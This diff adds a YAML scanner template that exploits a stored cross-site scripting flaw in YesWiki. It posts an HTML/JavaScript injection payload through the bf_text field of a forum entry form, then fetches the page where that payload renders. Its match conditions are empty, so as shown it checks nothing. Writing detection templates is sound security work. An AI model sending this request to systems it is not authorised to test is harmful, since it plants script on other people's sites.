@@ -1,0 +1,55 @@
+id: yeswiki-stored-xss
+brief:
+    title: YesWiki - Stored Cross-Site Scripting
+    by: arafatansari
+    level: high
+    about: YesWiki contains a stored contains a cross-site scripting vulnerability via the bf_text field when adding a new entry for Forum.
+    label:
+        - yeswiki
+        - xss
+        - stored-xss
+        - huntr
+        - intrusive
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/?BazaR&vue=saisir&action=saisir_fiche&id=2'
+      head:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT8dS2PT0WtxACLyu
+      body: |-
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_titre"
+
+        blog
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_text"
+
+        "><img src=x onerror=console.log(123);>
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="file"; filename=""
+        Content-Type: application/octet-stream
+
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="bf_description"
+
+        abcd
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="fichierbf_file"; filename=""
+        Content-Type: application/octet-stream
+
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="antispam"
+
+        1
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu
+        Content-Disposition: form-data; name="id_typeannonce"
+
+        2
+        ------WebKitFormBoundaryT8dS2PT0WtxACLyu--
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/?BazaR&vue=consulter'
+      signs: []
